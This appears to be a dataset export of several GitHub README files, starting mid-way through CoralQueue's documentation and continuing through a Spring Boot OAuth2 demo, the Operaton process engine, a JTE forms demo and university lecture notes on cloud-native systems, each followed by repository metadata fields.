- [BusySpinParkBackOffWaitStrategy](https://github.com/coralblocks/CoralQueue/blob/main/src/main/java/com/coralblocks/coralqueue/waitstrategy/BusySpinParkBackOffWaitStrategy.java): first busy spins for 10,000,000 cycles then it starts to park (i.e. sleep) by using the ParkBackOffWaitStrategy above. This is an example of a composite wait strategy, which combines multiple wait stratgies in a single one. The number of busy-spin cycles can be configured.
- [BusySpinYieldSleepWaitStrategy](https://github.com/coralblocks/CoralQueue/blob/main/src/main/java/com/coralblocks/coralqueue/waitstrategy/BusySpinYieldSleepWaitStrategy.java): busy spins for 10,000,000 cycles, yields for 100 cycles then starts to sleep for 1 millisecond. All previous values can be changed/configured.

To use a wait strategy, all you have to do is call its <code>await()</code> and <code>reset()</code> methods instead of busy spinning:

#### Producer using a Wait Strategy
```Java
WaitStrategy producerWaitStrategy = new ParkWaitStrategy();
StringBuilder sb;
while((sb = queue.nextToDispatch()) == null) {
    producerWaitStrategy.await(); // <=====
}
producerWaitStrategy.reset(); // <=====
sb.setLength(0);
sb.append(""Hello there!"");
queue.flush();
```

#### Consumer using a Wait Strategy
```Java
WaitStrategy consumerWaitStrategy = new BusySpinYieldSleepWaitStrategy();
long avail;
while((avail = queue.availableToFetch()) == 0) {
    consumerWaitStrategy.await(); // <=====
}
consumerWaitStrategy.reset(); // <=====
for(int i = 0; i < avail; i++) {
    StringBuilder sb = queue.fetch();
    // do whatever you want with the StringBuilder
    // just do not create garbage
    // copy char by char if needed
    // or copy the contents to an external StringBuilder
}
queue.doneFetching();
```
</details>

<details>
  <summary>Click here for all the details of how to use Semi-Volatile Writes</summary>

### All about using Semi-Volatile Writes (lazySet)

To squeeze every bit of performance out of CoralQueue, you can use <i>semi-volatile writes</i> (equivalent to [VarHandle.setRelease](https://docs.oracle.com/en/java/javase/23/docs/api/java.base/java/lang/invoke/VarHandle.html#setRelease(java.lang.Object...))) when sending and receiving messages. Basically, a semi-volatile write is done through the <code>lazySet</code> method from <code>java.util.concurrent.AtomicLong</code>. It is a faster operation for the thread that‚Äôs modifying the variable at the expense of the thread that‚Äôs interested in knowing about updates in the variable. For example, if you want to minimize the latency in the producer, you should use lazySet. On the other hand, if you want to minimize the message transit time, you should not use lazySet so the consumer is notified as soon as possible about a new message in the queue.

By default, CoralQueue does not use <code>lazySet</code>, in other words the other thread is notified immediately (or as soon as possible). But you can easily take control of that by using the methods below:
```Java
// producer notifying consumer(s)
queue.flush(); // no lazySet by default (notify the consumer thread immediately at the expense of the producer thread)
queue.flush(true); // use lazySet (take more time to notify the consumer thread in order not to introduce any latency to the producer thread)
```
```Java
// consumer notifying producer(s)
queue.doneFetching(); // no lazySet by default (notify the producer thread immediately at the expense of the consumer thread)
queue.doneFetching(true); // use lazySet (take more time to notify the producer thread in order not to introduce any latency to the consumer thread)
```
</details>
  
## Multiplexer

<img src=""images/Mux.png"" alt=""Multiplexer"" width=""50%"" height=""50%"" />

The Multiplexer allows multiple producer threads sending messages to the multiplexer and a single consumer thread receiving messages (all the messages) from the multiplexer, all running inside the same JVM.
The order that the consumer will process the messages is of course undetermined due to the simultaneous producers.

- Click [here](src/main/java/com/coralblocks/coralqueue/example/multiplexer/Minimal.java) for a minimal example of using the Multiplexer
- Click [here](src/main/java/com/coralblocks/coralqueue/example/multiplexer/Basics.java) for a basic example of using the Multiplexer

## Demultiplexer

<img src=""images/Demux.png"" alt=""Demultiplexer"" width=""50%"" height=""50%"" />

The Demultiplexer allows a single producer thread sending messages to the demultiplexer and multiple consumer threads receiving messages from the demultiplexer, all running inside the same JVM. `Note that messages are not duplicated by the demultiplexer.` They are distributed among the consumer threads, in other words, a message is processed only once by one of the consumers. `Also note that the order that the consumers will process the messages is undetermined.`

- Click [here](src/main/java/com/coralblocks/coralqueue/example/demultiplexer/Minimal.java) for a minimal example of using the Demultiplexer
- Click [here](src/main/java/com/coralblocks/coralqueue/example/demultiplexer/Basics.java) for a basic example of using the Demultiplexer

## MpMc

<img src=""images/MpMc.png"" alt=""MpMc"" width=""50%"" height=""50%"" />

The MpMc (i.e. Multiple Producers / Multiple Consumers) allows multiple producer threads sending messages to the mpmc and multiple consumer threads receiving messages from the mpmc, all running inside the same JVM. `Note that messages are not duplicated by the mpmc.` They are distributed among the consumer threads, in other words, a message is processed only once by one of the consumers. `Also note that the order that the consumers will process the messages is of course undetermined.`

- Click [here](src/main/java/com/coralblocks/coralqueue/example/mpmc/Minimal.java) for a minimal example of using the MpMc
- Click [here](src/main/java/com/coralblocks/coralqueue/example/mpmc/Basics.java) for a basic example of using the MpMc

## Broadcaster

<img src=""images/Broadcaster.png"" alt=""Broadcaster"" width=""50%"" height=""50%"" />

The Broadcaster allows a single producer thread sending messages to the broadcaster and multiple consumer threads receiving messages from the broadcaster, all running inside the same JVM. `Note that all consumers receive all messages.` `The consumer threads read the messages in the same order that they were sent by the single producer.`

- Click [here](src/main/java/com/coralblocks/coralqueue/example/broadcaster/Minimal.java) for a minimal example of using the Broadcaster
- Click [here](src/main/java/com/coralblocks/coralqueue/example/broadcaster/Basics.java) for a basic example of using the Broadcaster

## MpMcBroadcaster

<img src=""images/MpMcBroadcaster.png"" alt=""MpMcBroadcaster"" width=""50%"" height=""50%"" />

The MpMcBroadcaster (i.e. Multiple Producers / Multiple Consumers) allows multiple producer threads sending messages to the mpmc broadcaster and multiple consumer threads receiving messages from the mpmc broadcaster, all running inside the same JVM. `Note that all consumers receive all messages.` `Also note that the order that the consumers will process the messages is of course undetermined due to the simultaneous producers.`

- Click [here](src/main/java/com/coralblocks/coralqueue/example/mpmcbroadcaster/Minimal.java) for a minimal example of using the MpMcBroadcaster
- Click [here](src/main/java/com/coralblocks/coralqueue/example/mpmcbroadcaster/Basics.java) for a basic example of using the MpMcBroadcaster

## Diamond

<img src=""images/Diamond.png"" alt=""Diamond"" width=""50%"" height=""50%"" />

The Diamond allows tasks to be distributed across a set of _worker threads_ for execution. A producer thread will dispatch _tasks_ to the worker threads of the diamond and a consumer thread will fetch _executed_ tasks from the worker threads of the diamond. `It is not uncommon for the producer and consumer to be running on the same thread.` If order is important, in other words, if some tasks must be executed in order, they can be assigned to the same worker thread when the producer dispatches them.

- Click [here](src/main/java/com/coralblocks/coralqueue/example/diamond/Minimal.java) for a minimal example of using the Diamond
- Click [here](src/main/java/com/coralblocks/coralqueue/example/diamond/Basics.java) for a basic example of using the Diamond

## CoralRing

<img src=""images/OffHeapQueue2.png"" alt=""CoralRing"" width=""50%"" height=""50%"" />

CoralQueue is great for threads inside the same JVM. But what about threads running in _different JVMs_? For that you can check our [CoralRing](https://github.com/coralblocks/CoralRing) project which is an inter-process communication (IPC) shared-memory ring with waiting and non-waiting producers and consumers.
",0,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,9.0
danvega/spring-boot-oauth-demo,main,"# Spring Boot OAuth2 Login Demo

This project demonstrates how to implement OAuth2 authentication in a Spring Boot application using custom login pages with JTE (Java Template Engine) and Tailwind CSS. It includes both traditional form login and OAuth2 login with Google and GitHub.

## Features

- Custom login page using JTE and Tailwind CSS
- Traditional username/password authentication
- OAuth2 authentication with Google and GitHub
- Protected dashboard page
- User role display
- Secure logout functionality
- CSRF protection

## Prerequisites

- Java 17 or later
- Maven
- Google Cloud account (for Google OAuth)
- GitHub account (for GitHub OAuth)

## Quick Start

1. Clone the repository
```bash
git clone <repository-url>
cd spring-boot-oauth-demo
```

2. Configure OAuth credentials (see OAuth Setup sections below)

3. Set environment variables
```bash
export GOOGLE_CLIENT_ID=your_google_client_id
export GOOGLE_CLIENT_SECRET=your_google_client_secret
export GITHUB_CLIENT_ID=your_github_client_id
export GITHUB_CLIENT_SECRET=your_github_client_secret
```

4. Run the application
```bash
mvn spring-boot:run
```

5. Visit http://localhost:8080

## Default User Credentials

The application comes with a default user for testing:
- Username: `admin`
- Password: `admin123`

## Google OAuth2 Setup

1. Go to [Google Cloud Console](https://console.cloud.google.com/)

2. Create a new project or select an existing one

3. Configure the OAuth consent screen:
   - Go to ""APIs & Services"" > ""OAuth consent screen""
   - Choose ""External"" user type
   - Fill in required information:
      - App name
      - User support email
      - Developer contact information
   - Add scopes: email, profile, openid
   - Add test users if using external user type

4. Create OAuth2 credentials:
   - Go to ""APIs & Services"" > ""Credentials""
   - Click ""Create Credentials"" > ""OAuth client ID""
   - Choose ""Web application""
   - Add these URLs:
     ```
     Authorized JavaScript origins:
     http://localhost:8080

     Authorized redirect URIs:
     http://localhost:8080/login/oauth2/code/google
     ```
   - Note your client ID and client secret

## GitHub OAuth Setup

1. Go to [GitHub Developer Settings](https://github.com/settings/developers)

2. Click ""New OAuth App""

3. Fill in the application details:
   ```
   Application name: Your App Name
   Homepage URL: http://localhost:8080
   Authorization callback URL: http://localhost:8080/login/oauth2/code/github
   ```

4. Register the application

5. Note your client ID and generate a client secret

## Configuration

Create or update `application.yml`:

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
            scope:
              - email
              - profile
          github:
            client-id: ${GITHUB_CLIENT_ID}
            client-secret: ${GITHUB_CLIENT_SECRET}
            scope:
              - user:email
              - read:user

```

## Project Structure

```
src/
  main/
    java/
      com.example/
          SecurityConfig.java    # Spring Security configuration
          LoginController.java   # Login handling
          DashboardController.java # Dashboard pages
    resources/
      application.yml           # Application configuration
    jte/
      layout/
        default.jte            # Base template
      pages/
        login.jte             # Login page
        dashboard.jte         # Dashboard page
        home.jte              # Home page
```

## Key Dependencies

```xml
<dependencies>
    <!-- Spring Boot Starters -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-security</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-oauth2-client</artifactId>
    </dependency>
    
    <!-- JTE Template Engine -->
    <dependency>
        <groupId>gg.jte</groupId>
        <artifactId>jte-spring-boot-starter</artifactId>
        <version>3.1.9</version>
    </dependency>
</dependencies>
```

## Troubleshooting

### OAuth2 Issues

1. Redirect URI Mismatch
   - Verify the exact URIs in your OAuth provider settings
   - For Google: `http://localhost:8080/login/oauth2/code/google`
   - For GitHub: `http://localhost:8080/login/oauth2/code/github`
   - No trailing slashes
   - Correct protocol (http/https)
   - Correct port number

2. Authentication Errors
   - Clear browser cookies and cache
   - Check environment variables are set correctly
   - Verify OAuth provider console settings
   - Check application logs for detailed error messages

### Common Issues

1. Login Page Not Loading
   - Verify JTE configuration
   - Check template paths
   - Clear browser cache

2. Authentication Not Working
   - Verify default user credentials
   - Check OAuth configuration
   - Ensure CSRF token is present in forms

## Security Considerations

1. Production Deployment
   - Use HTTPS
   - Update OAuth redirect URIs for production domain
   - Secure client secrets
   - Enable CSRF protection
   - Consider session management settings

2. OAuth Provider Setup
   - Restrict OAuth scopes to minimum required
   - Verify redirect URIs
   - Protect client secrets
   - Use environment variables
",0,2,1,,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
operaton/operaton,main,"# Operaton - The open source process engine

![build status](https://github.com/operaton/operaton/actions/workflows/build.yml/badge.svg?branch=main)
[![sonarqube](https://img.shields.io/sonar/tests/operaton_operaton?server=https%3A%2F%2Fsonarcloud.io&logo=sonarcloud)](https://sonarcloud.io/project/overview?id=operaton_operaton)
[![Maven Central Version](https://img.shields.io/maven-central/v/org.operaton.bpm/operaton-bom-root?color=blue&logo=apachemaven)](https://central.sonatype.com/search?q=org.operaton)

[![operaton manual latest](https://img.shields.io/badge/manual-latest-brown.svg)](https://docs.operaton.org/)
[![License](https://img.shields.io/github/license/operaton/operaton?color=blue&logo=apache)](https://github.com/operaton/operaton/blob/main/LICENSE)


[![Forum](https://img.shields.io/badge/forum-Operaton-green)](https://forum.operaton.org/)
[![Slack](https://img.shields.io/badge/chat-Slack-purple)](https://join.slack.com/t/operaton/shared_invite/zt-2yubtdpwm-GvmBCzyx1OVihW3v2NnCvw)

Operaton is a native BPMN 2.0 process engine that runs inside the Java Virtual Machine. It can be embedded inside any Java application and any Runtime Container. It integrates with Spring, Spring Boot, Quarkus and is a perfect match for Jakarta EE. On top of the process engine, you can choose from a stack of tools for human workflow management, operations and monitoring.

- Web Site: https://www.operaton.org/
- Getting Started: https://docs.operaton.org/
- User Forum: https://forum.operaton.org/
- Issue Tracker: https://github.com/operaton/operaton/issues

### This is a fork of the Camunda 7 BPM platform

We have not removed the old issue links and they still lead to Camunda's JIRA or the GitHub repo.

### What we plan to do and where we are going
Take a look at our [Roadmap](https://www.operaton.org/en/#roadmap)

### Want to talk to us or other people around Operaton?
Visit our [Forum](https://forum.operaton.org)

## Building
Prerequisites:

JDK 17 or newer - check `java -version`

You can use the Maven Wrapper script to execute the build. The script downloads and installs (if necessary) the required Maven version to `~/.m2/wrapper` and runs it from there.

On Linux and MacOS, run
```shell
./mvnw
```

On Windows, run
```shell
mvnw
```

Alternatively, you can use the your own Maven installation (minimal version: 3.9.0) Wrapper and execute
```shell
mvn
```

For a faster build you can add `-DskipTests` to skip test execution and `-Dskip.frontend.build=true` to skip the build of the webapps.

## Get it!

Get the latest release from the [Releases page](https://github.com/operaton/operaton/releases).

To get the latest stable build visit the [Early Access release page]([https://github.com/operaton/operaton/actions/workflows/nighly-build.yml?query=branch%3Amain+event%3Aschedule+is%3Asuccess++](https://github.com/operaton/operaton/releases/tag/early-access)), click on _Assets_ and download the desired package.


## About Operaton

### Components

Operaton provides a rich set of components centered around the BPM lifecycle.

#### Process Implementation and Execution

- Operaton Engine - The core component responsible for executing BPMN 2.0 processes.
- REST API - The REST API provides remote access to running processes.
- Spring, CDI Integration - Programming model integration that allows developers to write Java Applications that interact with running processes.

#### Process Operations

- Operaton Engine - JMX and advanced Runtime Container Integration for process engine monitoring.
- Operaton Cockpit - Web application tool for process operations.
- Operaton Admin - Web application for managing users, groups, and their access permissions.

#### Human Task Management

- Operaton Tasklist - Web application for managing and completing user tasks in the context of processes.

### Highly Integrable

Out of the box, Operaton provides infrastructure-level integration with Java EE Application Servers and Servlet Containers.

### Embeddable

Most of the components that make up the platform can even be completely embedded inside an application. For instance, you can add the process engine and the REST API as a library to your application and assemble your custom BPM platform configuration.

### Process modelling

Operaton is fully backwards compatible to your existing BPMN-, DMN-models and Forms, which were created in Camunda Modeler for Camunda 7. You can download the Camunda Modeler [here](https://camunda.com/download/modeler/) (MIT Licence). 

## Documentation

The documentation is currently under construction. Currently, you can use the [Camunda 7 Manual](https://docs.camunda.org/manual/7.22/) as a reference.
Since Operaton is a fork of Camunda 7, most of the documentation is still valid. We will provide a new manual soon.

## Contributing

Please see our [contribution guidelines](CONTRIBUTING.md) for how to raise issues and how to contribute code to our project.

## Tests

To run the tests in this repository, please see our [testing tips and tricks](TESTING.md).

## Prerequisites

Java 17 or higher is required.

## License

The source files in this repository are made available under the [Apache License Version 2.0](./LICENSE).

Operaton uses and includes third-party dependencies published under various licenses. By downloading and using Operaton artifacts, you agree to their terms and conditions. Refer to our [license-book.txt](./distro/license-book/src/main/resources/license-book.txt) for an overview of third-party libraries and particularly important third-party licenses we want to make you aware of.

## Contributors

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->
",4,40,18,Apache-2.0,4,334.0,1.0,10.0,1.0,16.0,0.0,-6.800000000000001,22118.0
adsoftsito/competitive_programming,main,"Welcome to Competitive Programming Club

1. Download competitive programming book
2. Download Junior Trainning Template excel
3. Enter to club [team](https://docs.google.com/spreadsheets/d/1c7JFa8pFZIxwEcXBxeDZT8foNpuYkmjV3aP9ss_91ts/edit?usp=sharing)

# Session 1
[Slides 1](https://docs.google.com/presentation/d/1rpNoqcZLTZy481P7jhzwmVMlky9b8QiW/edit?usp=sharing&ouid=112454259737266877874&rtpof=true&sd=true)

# Session 2
[Slides 2](https://docs.google.com/presentation/d/1hbJRfII9Z_9ueiPMnIWz7j0DJ4JY1xk7/edit?usp=sharing&ouid=112454259737266877874&rtpof=true&sd=true)

# Session 3
[Slides 3](https://docs.google.com/presentation/d/1Rs7ufmnrbMhTvx15BTetqWUn3JqAcBze/edit?usp=sharing&ouid=112454259737266877874&rtpof=true&sd=true)
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
danvega/jte-forms,main,"# JTE + Forms

Welcome to the JTE + Forms project! This Spring Boot application showcases the integration of JTE (Java Template Engine) with form handling, providing a robust foundation for building web applications with server-side rendering.

## Project Overview

This project demonstrates how to:
- Set up a Spring Boot application with JTE
- Handle form submissions
- Perform data validation
- Interact with a PostgreSQL database using Spring Data JDBC

## Project Requirements

- Java 23
- Maven
- Docker (for running PostgreSQL)

## Dependencies

This project relies on the following main dependencies:

- Spring Boot 3.3.4
- Spring Web
- Spring Data JDBC
- JTE (Java Template Engine) 3.1.12
- PostgreSQL
- Spring Boot Docker Compose
- Spring Boot Validation
- [Spring Initializr](https://start.spring.io/#!type=maven-project&language=java&platformVersion=3.3.4&packaging=jar&jvmVersion=23&groupId=dev.danvega&artifactId=jte-forms&name=jte-forms&description=Spring%20Boot%20%2B%20JTE%20%2B%20Forms&packageName=dev.danvega&dependencies=web,jte,data-jdbc,postgresql,docker-compose,devtools)

## Getting Started

To get started with this project, follow these steps:

1. Ensure you have Java 23 and Maven installed on your system.
2. Make sure Docker is running on your machine (for PostgreSQL).

## How to Run the Application

1. Clone the repository (if you haven't already).
2. Navigate to the project root directory.
3. Run the following command to start the application:

```bash
./mvnw spring-boot:run
```

This command will:
- Download all necessary dependencies
- Compile the project
- Start a PostgreSQL container using Docker Compose
- Run the Spring Boot application

Once started, you can access the application by opening a web browser and navigating to `http://localhost:8080`.

![Form](/images/personal_info_form.png)

## Relevant Code Examples

Let's look at some key parts of the application:

### User Model

The `User` class represents the data model for user information:

```java
@Table(""users"")
public class User {
    @Id
    private Long id;
    @NotBlank(message = ""The First Name field should not be blank."")
    private String firstName;
    @NotBlank(message = ""The Last Name field should not be blank."")
    private String lastName;
    private String email;
    // ... other fields and methods
}
```

This class uses annotations for database mapping (`@Table`) and validation (`@NotBlank`).

### User Controller

The `UserController` handles HTTP requests for user operations:

```java
@Controller
public class UserController {
    private final UserRepository repository;

    @GetMapping(""/"")
    public String index(Model model) {
        model.addAttribute(""user"", new User());
        return ""index"";
    }

    @PostMapping(""/save"")
    public String saveUser(@Valid User user, Model model) {
        repository.save(user);
        model.addAttribute(""message"", ""User information saved successfully!"");
        return ""index"";
    }

    // ... error handling methods
}
```

This controller demonstrates how to handle GET and POST requests, perform validation, and interact with the database.

### JTE Template

The main (and only) JTE template for this application is located at `src/main/jte/index.jte`. This template is responsible for rendering the user form and displaying messages.

Here's an overview of what the `index.jte` does:

1. It displays a form for user input, including fields for first name, last name, email, and address information.
2. The form is set up to submit to the ""/save"" endpoint using the POST method.
3. If there's an error message (e.g., validation errors), it's displayed at the top of the form.
4. If there's a success message (after successful form submission), it's also displayed.
5. The template uses JTE syntax to handle conditional rendering and to populate form fields with existing user data (if any).

This single template handles both the initial form display and the form redisplay after submission, whether successful or not. It's a great example of how JTE can be used to create dynamic, server-rendered pages in a Spring Boot application.

## Conclusion

The JTE + Forms project provides a solid starting point for building web applications with Spring Boot and JTE. It showcases form handling, data validation, and database interactions, all while leveraging the power of server-side rendering.

Feel free to explore the code, experiment with the form submission, and extend the application to suit your needs. Pay special attention to the `index.jte` file to see how JTE templates work with Spring Boot. If you have any questions or run into issues, please don't hesitate to open an issue in the repository.

Happy coding!




",0,0,1,,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
maeddes/hft-24-winter,main,"# hft-24-winter

## Initial Brainstorming session

### Evolution of the lecture over the years

![Evolution](/images/2024_11_10_lecture_evolution.png)

### Basic distributed system - Communication & State

![Basics](/images/2024_11_10_basic_distributed_system.png)

### Modern distributed system 

![Advanced](/images/2024_11_10_modern_distributed_environment.png)

### Why distributed systems

![Why](/images/2024_11_10_brainstorm_why_distribution.png)

### Outlook on container technology

![Container Technology](/images/2024_11_10_container_technology.png)


## **2024 / 10 / 11 - Introduction to distributed systems - Overview Cloud Computing**  

### **Content Overview**
1. **The NIST Cloud Definition (2011)**
   - Breakdown of the NIST‚Äôs five essential cloud characteristics, deployment models, and service models.
  
2. **Overview of Major Cloud Providers**
   - Key players in the cloud space (AWS, Azure, Google Cloud, etc.).
   - Comparing evolution.

3. **Cloud Service/Abstraction Models**
   - IaaS, PaaS, SaaS revisited, with modern examples.
   - The evolution of abstraction models, including FaaS and Containers-as-a-Service (CaaS).

4. **Introduction to CNCF**
   - Role of the Cloud Native Computing Foundation (CNCF) in the cloud ecosystem.
   - CNCF Landscape: technologies, tools, and projects.

5. **Popular Technologies**
   - **Kubernetes**: Container orchestration in cloud-native environments.
   - **eBPF**: Extending kernel capabilities for monitoring and security.
   - **OpenTelemetry**: Observability standards and practices in modern cloud systems.

---

### **Learning Objectives**
By the end of this lecture, students will be able to:
- Describe the NIST cloud definition and its significance in the modern cloud landscape.
- Identify the major cloud providers and tell about their evolution.
- Differentiate between cloud service models and discuss their evolution, including modern abstraction models like CaaS.
- Explain the role of CNCF and analyze the CNCF landscape to identify key technologies and trends.
- Provide an overview of Kubernetes  (,eBPF, and OpenTelemetry,) explaining their impact on cloud-native development.

---

### **Student/Review Questions**
#### For now:
1. What are the five essential characteristics of cloud computing according to NIST, and how do they apply to modern cloud services?
2. Identify 3 main cloud providers.
3. What are the differences between IaaS, PaaS, and SaaS? Give examples of each in today's cloud ecosystem.
4. What is the CNCF, and why is it important in the context of cloud-native technologies?
#### For later:
5. How does Kubernetes help in managing containerized applications in cloud-native environments?

---

### **Suggested Reading & Resources**
- [NIST 2011 Cloud Computing Definition](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-145.pdf)
- CNCF [Cloud Native Landscape](https://landscape.cncf.io/)
- [Introduction to Kubernetes](https://kubernetes.io/docs/tutorials/)
- [Understanding eBPF](https://ebpf.io/)
- [OpenTelemetry Documentation](https://opentelemetry.io/docs/)

---

### Homework

- Get a GitHub or GitLab or Bitbucket account
- Play with Codespaces, Gitpod or IDX

Here‚Äôs the documentation for the new lecture:

---

## **2024 / 10 / 18 - Introduction to Spring Boot - Overview Cloud IDEs**  

### **Content Overview**

1. **Introduction to Spring Boot**
   - **Evolution of Spring to Spring Boot**: Understanding how Spring Boot simplifies Spring applications, focusing on convention over configuration.
   - **Spring Initializr**: A web-based tool for quickly creating Spring Boot projects with customizable dependencies.
   - **Key Dependencies**:
     - **Web**: Building RESTful web services and web applications.
     - **Actuator**: Providing production-ready features such as monitoring and health checks.
   - **application.properties**: Configuration of application settings in Spring Boot projects.
   - **Spring Boot Project Structure**: Understanding the typical structure of a Spring Boot project and how it facilitates development.

2. **Overview of Cloud-Based IDEs**
   - **GitHub Codespaces**: Cloud-hosted development environments integrated with GitHub, enabling easy setup and collaboration.
   - **Gitpod**: Automating cloud-based development workspaces with pre-configured environments.
   - Advantages of cloud-based IDEs for Spring Boot development: instant setup, collaboration, and scalability.

---

### **Learning Objectives**
By the end of this lecture, students will be able to:
- Describe the evolution of Spring to Spring Boot and how Spring Boot improves application development.
- Use Spring Initializr to create Spring Boot projects with appropriate dependencies.
- Understand and configure application properties using `application.properties` in Spring Boot.
- Identify the key components and structure of a typical Spring Boot project.
- Compare GitHub Codespaces and Gitpod, and explain how cloud-based IDEs enhance Spring Boot development workflows.

---

### **Student/Review Questions**
1. What are the key differences between traditional Spring and Spring Boot?
2. How does Spring Initializr simplify the creation of Spring Boot projects, and what are some essential dependencies you might include?
3. What role does the `application.properties` file play in a Spring Boot project?
4. What can you derive from the following code snippet:
```java
	@GetMapping(""/hello/{name}"")
	public String sayHelloWithParameter(@PathVariable String name){

		return ""Hallo, ""+name;

	}
```
5. How does GitHub Codespaces or Gitpod make it easier to develop Spring Boot applications in a cloud environment?
6. What are the key benefits of using a cloud-based IDE over a local development environment for any kind of development?

---

### **Suggested Reading & Resources**
- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
- [Spring Initializr](https://start.spring.io/)
- [Spring Boot Actuator Documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html)
- [GitHub Codespaces Documentation](https://github.com/features/codespaces)
- [Gitpod Documentation](https://www.gitpod.io/docs)
- [Baeldung Actuator](https://www.baeldung.com/spring-boot-actuator-enable-endpoints)

### Homework
- Build a Spring Boot Hello, World REST API Project using Codespaces or GitPod

## **2024 / 10 / 25 - Containers**
### Content Overview

1. Development in distributed teams withouth containers and the potential problems:
   - Polyglot application landscapes are challenging as all work environments need to match all runtime requirements for all languages
   - Transporting application from environment A to environment B introduces challenges and problems with mismatching runtimes

2. **Containers**
   - Isolate Applications from each other
   - Package Applications along with all Runtime requirements for easy execution and transportation between working environments
   - Simplify configuration of working environments -> only container engine needed
   - handling of all application containers through same mechanisms: docker build, docker run

3. **Docker**
   - Docker ecosystem consists of the Docker Daemon, Docker CLI and Docker Hub+
   - Creation of Dockerfiles
   - Building Images
   - Running Containers

4. **Exercises**
   - Exercises can be found at: https://lecture.new.trainings.nvtc.io/basics/container/

### **Student/Review Questions**
1. What is Docker, and how does it differ from traditional virtual machines?
2. Explain the concept of a Docker image and a Docker container. How are they related?
3. What are the main components of a Dockerfile? Describe the purpose of each component.
4. How does Docker ensure isolation and security between containers?
5. What is a container registry, and how do you use Docker Hub to share or deploy images?
6. Describe the process of building and running a containerized application using Docker, including common commands.

### Homework
- Get a Dockerhub account
- Work through the exercises

## **2024 / 11 / 08 - Cloud-Native Theory and Persistence**  

### **Content Overview**

1. **Distributed Systems Theory**
   - **CAP Theorem**: Understanding the trade-offs between Consistency, Availability, and Partition Tolerance in distributed systems.
   - **Conway's Law**: Exploring how software design reflects organizational structure and its implications for distributed systems.
   - **12-Factor Applications**: Best practices for building scalable, maintainable applications, focusing on principles like configuration, dependencies, and logging.
   - **Microservices**: Basic concept of microservices, its advantages, and challenges in distributed systems.

 2. **Introduction to Persistence, ORM, Spring Data, and Spring Data JPA**
   - **Persistence and ORM**: Discussed the importance of persistence for long-term data storage, introducing ORM as a way to map objects to relational database tables seamlessly.
   - **Spring Data JPA**: Explored how Spring Data JPA simplifies data access through repository interfaces, enabling easy CRUD operations and custom queries without boilerplate code.

---

### **Learning Objectives**
By the end of this lecture, students will be able to:

- Describe the CAP Theorem, its components, and how it affects design choices in distributed systems.
- Explain Conway‚Äôs Law and its influence on software architecture, especially in the context of microservices.
- List and apply the 12 factors for building scalable, portable, and maintainable applications.
- Define and differentiate microservices architecture from other architectural styles.
- Domain Driven Design is not relevant for the exam!

- Explain the concepts of **persistence** and **ORM** and identify their importance in distributed, database-driven applications.
- Set up **Spring Data JPA** to interact with a relational database and configure it using Docker Compose.

### **ABOVE ALL**

Be able to relate the concepts of CAP theorem and the 12-factor apps to the technologies we are covering in the lecture,
e.g. how do technologies like Spring Boot (or other frameworks/languages), Docker, Kubernetes incorporate or implement those aspects

---

### **Student/Review Questions**
1. What are the components of the CAP Theorem, and why can‚Äôt a distributed system fully achieve all three?
2. How does Conway‚Äôs Law impact the structure of a distributed system, especially when adopting a microservices architecture?
3. What are the key factors of a 12-factor app, and how do they contribute to application scalability and resilience?
4. Describe microservices concepts and some of its advantages over a monolithic architecture.
5. Explain how Spring Data JPA helps in managing CRUD operations in a database. 

---

### **Suggested Reading & Resources**
- [Understanding the CAP Theorem](https://cs.uwaterloo.ca/~kmsalem/courses/CS848/W16/readings/cap.pdf)
- [Conway‚Äôs Law - A Key Consideration in Architecture](https://www.thoughtworks.com/insights/blog/conways-law-and-modern-software-factories)
- [The Twelve-Factor App](https://12factor.net/)
- [Microservices Architecture Documentation](https://microservices.io/patterns/microservices.html)

## **2024 / 11 / 15 - APIs and REST & Distributed Application Development

![REST and multi-application setup](/images/2024_11_15_REST_multi_container.png)

### **Content Overview**

1. **API and REST**  
   - **HTTP Basics**: Core concepts of HTTP for APIs, including request/response structure.  
   - **Introduction to REST**: Understanding the foundational ideas of REST as defined by Roy Fielding and how RESTful APIs communicate.  
   - **Nouns and Verbs**: Structuring REST APIs around resources (nouns) and actions (verbs).  
   - **Representation**: Data formats in REST (e.g., JSON, XML) and the role of content negotiation.  
   - **HTTP Return Codes**: Standard HTTP status codes, their meanings, and when to use each in API responses.  
   - **Idempotency**: Ensuring repeatable requests yield the same results to prevent unintended side effects.  
   - **Richardson's Maturity Model**: Levels of RESTful maturity, from Level 0 (HTTP as a tunnel) to Level 3 (HATEOAS), to understand API design progression.  
   - **OpenAPI and Swagger**: Using OpenAPI for defining APIs, ensuring consistency, and employing Swagger UI for visualization and testing.

2. **Docker-Compose for Multi-Component Applications**  
   - Setting up multi-component applications using Docker Compose, integrating backend APIs, databases, and frontends in a single `docker-compose.yml` file.  
   - Configuration of service communication, externalized settings, and container networking to simplify deployment and scaling.

---

### **Objectives and Exercises**

*Students should be able to:*

- Describe the foundational principles of REST and explain the HTTP concepts that underpin REST APIs.  
- Use OpenAPI to define REST APIs and visualize them with Swagger UI.  
- Create and configure a Docker Compose file to integrate multiple application components and enable effective communication between services.  

---

### **Student/Review Questions**

1. **What are the core principles of REST, and how do they align with HTTP concepts?**  
2. **Explain the importance of structuring REST APIs around resources (nouns) and actions (verbs). Provide examples.**  
3. **What is Richardson‚Äôs Maturity Model, and how does it help assess the maturity of a REST API?**  
4. **Why is idempotency important in REST APIs? Give an example of an idempotent and a non-idempotent HTTP method.**  
